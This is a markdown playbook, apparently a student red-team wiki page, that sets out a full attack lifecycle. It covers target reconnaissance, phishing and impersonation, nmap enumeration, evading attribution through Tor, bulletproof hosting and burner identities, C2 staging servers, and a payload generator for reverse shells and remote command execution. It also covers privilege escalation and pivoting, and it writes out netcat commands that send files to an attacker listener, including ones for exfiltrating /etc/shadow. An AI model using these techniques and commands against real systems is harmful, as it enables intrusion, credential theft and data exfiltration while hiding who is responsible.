# Operation Plans
****************************************************************
## <u>Infrastructure Acquisition Plan</u>

### Searching Publicly Available Information 

Browse the target’s websites, social media accounts, and articles and interviews with the target.

In any of these points, there may be information about the technology they have within their systems. 

Places to check may include: twitter/facebook/instagram accounts, organization websites, technology policies, and news sites with interviews of staff/clients. 

These could give insight to things such as the software their backend is running to IoT devices within the building. Pictures may have devices or computer screens within them, which may prove to contain valuable information. 

Additionally, any information about people related to the targeted infrastructure within a reasonable degree of distance (i.e. friends of people who directly interact with the target infrastructure) is valuable, and could be used to better create a social engineering based attack. 

#### Publicly Available Source Code

There may be some indication that the target's infrastructure is heavily based on publicly available source code. This may be useful for finding exploits or additional information about the target infrastructure. For instance, some sites use templates that are hosted publicly and may have known vulnerabilities that are listed in sites such as www.exploit-db.com

### Social Engineering

Contacting the target without revealing any malintent may lead to useful information. This could be done through e-mail, social media, VOIP, servers (etc.). Pretending to be an interviewer, targeting phishing attacks, and creating fake/mimic social media accounts of friends or coworkers are all potential vectors to take an attack.

The scope of these attacks could range from trying to get information to gaining information about credentials and could last from hours to weeks. Building trust and credibility with the target is a great asset for this route. 

### Network Enumeration

#### Using NMAP to Enumerate Webserver Ports

##### Belligerent (No Stealth Needed)

`nmap -A -p- TARGETIP`

This will scan all ports and essentially return any information that may be useful, including open ports and the services (and versions) running on them.

##### Stealthy 

`nmap -sS -sV TARGETIP -p LOWERPORT-UPPERPORT`

This will scan the target IP from ports LOWERPORT to UPPERPORT retrieving the open ports and the services running on them (and versions). Dropping the -sV command will no longer retrieve the services

#### Using DirBuster to Enumerate Web/Application Server Directories and Files

Useful for locating files and directories that are not directly linked to but still accessible from default permissions. May have developmental or vulnerable web pages that may be exploited to grant access. For more information on using dirbuster, I have a page here: https://git.mst.edu/slbnmc/ici-wiki/-/wikis/Enumerating-Web-Server-Files-and-Directories-with-DirBuster

If stealth is needed, be sure to limit the rate of requests.

****************************************************************

## <u>Operational Security Plan</u>

### Hiding Location

Distance (in terms of connection hops) is your friend.

#### Proxied Connections
By using proxy connections, even if the proxy is discovered to be a source of the attack and blocked, the attack source can be moved to another proxy to continue attacking.

##### Multi-hop proxy
Routing traffic through a multi-hop proxy client such as tor, or use multiple proxies to make tracking the attacking location more difficult

##### Dead-Drop Payloads/Instructions
Distancing the attacker from any devices may always be of benefit. One method to protect the attacker is by proxying through dead-drops on sites like pastebin or in public comment sections. Care should be taken, however, so consider using additional proxies when connecting to the dead-drop locations. 


### Hiding Identity(ies)

When conducting an attack, especially if conducting a method that interfaces with someone, avoid reusing identities, especially those that have become suspicious or compromised. If a mistake has been made while using an identity or a proxy, do not reuse it during critical moments of an attack, or at all if possible. 

Don't get caught from using your old runescape alias that has payments from your mom's credit card on it.

### Hiding Critical Files/Directories

Hiding files/directories may help hide payloads or implants from prying eyes. 

### Additional Strategies for Avoiding Attribution

- Randomizing modes of communication (Encryption, ports, servers, etc) can help avoid attribution.
- Encrypting communications with compromised devices/implants
- Obfuscating code flow and addresses


****************************************************************

## <u>Tool Staging Plan</u>

### Virtual Private servers
There are many VPS hosters, logless and bulletproof providers are preferred. These can be used to host C2 servers and staging servers.

### Staging Servers
Staging server can be used to host tools, binaries, and upload/download files.

A simple server HTTP server can be set up locally (not recommended) or on a VPS to recieve and stage files. This can be done with something like [this script](/src/StagingServer.js)

This script can be set up by doing the following steps:
1. Download the staging server to the directory you wish you host it from.
2. Access the directory it is installed to (ex: `cd ~/Downloads/server`)
3. Edit the StagingServer.js file to have the traffic directed through by editing the PORT value. This port must be open and (if needed) port forwarded to the device.
4. run `npm install express` and `npm install node` in the directory the file is downloaded to
5. Edit the server as needed to stage/recieve files
6. Run `node StagingServer.js` to start the server.
   
### Payload Generator

[payloadgenerator](/src/payloadgenerator.py) is a tool capable of generating payloads for linux/android for the following purposes:
- [Uploading files from the target device](#pg-uploading-files)
- [Downloading files to the target device](#pg-downloading-files)
- [Opening a reverse shell](#pg-reverse-shell)
- [Executing commands](pg-command-execution)
- [Retrieving system spec information](#pg-system-info-payload)

It is a python script that has the following arguments. 

> -e: chooses which payload to generate
> -i:Host IP address
> -p:Host Port
> -li:IP Address used for sending back results
> -lp:Port used for sending back results
> -c: Executed commands for cmd option
> -o: Output file name

#### PG: Uploading files 
A payload for Uploading files from the machine can be made with the “-e upload” argument. 

Example:
`python3 payloadgenerator.py -e upload -li LISTERNERIP1 -lp LISTENERPORT1 -i LISTERNERIP2 -p LISTENERPORT2`

Usage:
Set up two listener shells on an attacker controlled device using nc, one for taking in the file and downloading it to a file like so
	`nc -nlvp PORT > SAVELOCATION`

And one for listening for feedback which the target machine will send a file hash to
	`nc -w CONNECTIONTIMEOUTLENGTH -knlp PORT2 `

The script requires the following arguments to generate the payload:

> -i: ip of the shell listening for the file
> -p: the port used for the shell listening for the file (PORT)
> -li: ip of the shell listening for the hash of the file
> -lp: the port used for the shell listening for the hash (PORT2)
> -f: what file is to be uploaded

#### PG: Downloading files 
A payload for Downloading files to the machine can be made with the “-e download” argument. 

Example Command:
`python3 payloadgenerator.py -e download -li LISTERNERIP1 -lp LISTENERPORT1 -i LISTERNERIP2 -p LISTENERPORT2`

Usage:
Set up two listener shells on an attacker controlled device using nc, one for streaming the file to target device
	`nc -nlvp PORT < test`
And one for listening for feedback which the target machine will report that the file was or couldn’t be downloaded (in future it will also include an md5 hash of the file it downloaded for better validation)
	`nc -w CONNECTIONTIMEOUTLENGTH -knlp PORT2 `

The script requires the following arguments to generate the payload

> -i: ip of the shell sending the file
> -p: the port used for the shell listening for the file (PORT)
> -li: ip of the shell listening for the hash of the file
> -lp: the port used for the shell listening for the hash  (PORT2)
> -f: Where to save file on target device

#### PG: Reverse Shell
Alternatively, see the [php shell tool](#php-shell)

Example:
`python3 payloadgenerator.py -e rshell -li LISTERNERIP1 -lp LISTENERPORT1 -i LISTERNERIP2 -p LISTENERPORT2`

Usage: 
Set up two listener shells on an attacker controlled device using nc, one for taking in the commands
	`nc -w CONNECTIONTIMEOUTLENGTH  -nlvp PORT `

And one for listening for feedback which the target machine will send
	`nc -w CONNECTIONTIMEOUTLENGTH -knlp PORT2 `

The script requires the following arguments to generate the payload:
> -i: ip of the shell listening for the file
> -p: the port used for the shell listening for the file (PORT)
> -li: ip of the shell listening for the hash of the file
> -lp: the port used for the shell listening for the hash (PORT2)

#### PG: Command Execution
Example:
`python3 payloadgenerator.py -e cmd -li LISTERNERIP -lp LISTENERPORT -c COMMAND TO EXE`

Usage:
Set up one listener shell to listen for the output of the command
	`nc -w CONNECTIONTIMEOUTLENGTH -knlp PORT`
 
The script requires the following arguments to generate the payload:
> -c command(s) to execute on target machine
> -li: ip of the shell listening for the hash of the file
> -lp: the port used for the shell listening for the hash (PORT2)

#### System Info Payload
Outputs information about the host system

Example Command:
`python3 payloadgenerator.py -e sysinfo -li LISTERNERIP -lp LISTENERPORT`

Usage:
Set up one listener shell to listen for the output of the command
	nc -w CONNECTIONTIMEOUTLENGTH -knlp PORT
 
The script requires the following arguments to generate the payload:
> -li: ip of the shell listening for the hash of the file
> -lp: the port used for the shell listening for the hash (PORT2)

### Code Analysis

Useful tools and commands for code analysis

#### Open Source

Some software will be open source and able to be analyzed without use of tools

#### GDB

GNU Debugger, supports the following languages:
1. Ada
2. Assembly
3. C
4. C++ 
5. D
6. Fortran
7. Go
8. Objective-C
9. OpenCL
10. Modula-2
11. Pascal
12. Rust

`sudo apt install gdb`

[Useful Cheatsheet](http://users.ece.utexas.edu/~adnan/gdb-refcard.pdf)

#### Jadx

Decompiles into SMALI code. Useful for APKs

Github available [here](https://github.com/skylot/jadx).

#### Ghidra

Available on the [Ghidra website](https://ghidra-sre.org/)

#### Frida

`pip install frida-tools`

Can be used to edit values in apks using js scripts like [frida-example.js](/src/frida-example.js). 
By using `frida -U -l SCRIPTTOUSE -f TARGETAPPLICATION --no-pause`

### Password Cracking

#### John the Ripper

Useful for cracking credential files. Just run it on the password file. (Must have permissions to read)

Can be grabbed form [here](https://www.openwall.com/john/).

### Misc Tools

#### PHP Shell
Single file php shell 

https://github.com/flozz/p0wny-shell

#### Boofuzz
A fuzzing tool

https://github.com/jtpereyda/boofuzz

#### Wireshark
Network sniffer, useful for viewing data traveling through a network

https://www.wireshark.org/download.html

#### BurpSuite
Has a useful packet intercepter allowing for an attacker to edit packets that are being sent to a server or analyze packets after each action. Great filters

Community Edition (Free): https://portswigger.net/burp/communitydownload
****************************************************************

## <u>Remote Connection Plan</u>

### Exploit Abuse
There may be vulnerabilities for the given software or hardware that the target is using. If the software or hardware is known, it may be worthwhile to investigate for potential exploits and vulnerabilities that are known, especially if the software the target is using is outdated.

#### SQL/Command Injection

In some cases, sites improperly handle user input by not properly sanitizing it and execute the input. This can lead to code execution or sql queries. Worth attempting when there are locations where the user is allowed to directly input text. 

##### Fuzzing

Sometimes the sanitation of input is poorly done and can break under only certain circumstances, thus fuzzing may be of use. See [Boofuzz](#boofuzz) for more info on a fuzzing tool

##### Information Leakage

While sometimes the attempts at this does not result in execution, there may be errors or information that get revealed that are helpful in finding an exploit. 

#### Unprotected Data

Sometimes there is unprotected data that may be of use when exploiting or gaining access to the server. Using [DirBuster](#using-dirbuster-to-enumerate-webapplication-server-directories-and-files) may be helpful in finding unprotected data. 

#### File Execution

Some sites may have exploits that allow users to upload files, which then can be used to be executed by accessing them. An example of this can be seen in this report here: https://github.com/eldenwyre/probable-lamp.



****************************************************************

## <u>Actions on Objective Plan</u>

Aside from general command execution, the following can be performed as well

### Installing Implant

An implant could be installed to perform actions based on commands from a C2 server given it is granted sufficient permissions. Implants can be designed on a per-mission basis or for general operations.

### Privilege Escalation

#### linPEAS

Useful privilege escalation tool for Linux/Unix devices. Also has an AV bypass guide. Can be found on the [github here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

#### Searching for any credentials saved on the disk

Sometimes there are poor security practices where credentials are saved in text files or in email logs. 

#### Password Cracking

If possible, /etc/shadow could be exfiltrated then run through password crackers such as [John the Ripper](#john-the-ripper) or run against a rainbow table

### Exfiltrating Files

#### Netcat

Files could be sent to a location via netcat if the other side has a netcat listener that feeds into a file. 

Listener:
`nc -knlp PORT > FILETOSAVETO`
Client:
`cat FILETOUPLOAD | nc LISTENERIP PORT`


#### File Sharing Sites

Files could also be uploaded to a file sharing site so long as the generated URL is communicated to the / the location is predetermined

#### Uploading to Server

Files could be uploaded to a [staging server](#staging-servers) which downloads any files it recieves to a directory.

#### Burner Emails

Files could be sent to burner emails that were made just for this mission. Do not reuse burner emails, they're called burner for a reason.  

#### Payload

[Payload Generator](#payload-generator) has a payload for exfiltrating files via nc

### Utilizing as a Pivot Point

After gaining access to a device on a network, it ~~may have~~ likely has more permissions than you as an outside attacker. As such, the device can be used as a pivot point to gain more insight about the network and compromise more devices on the network. 

For example, [wireshark](#wireshark) might be able to be run within the network now. Which may give valuable information.

### Key Directories

#### Android

Since I constantly forget where this is (may expand in future) : ) 
- `/data/local/tmp` has execution privileges. 
****************************************************************
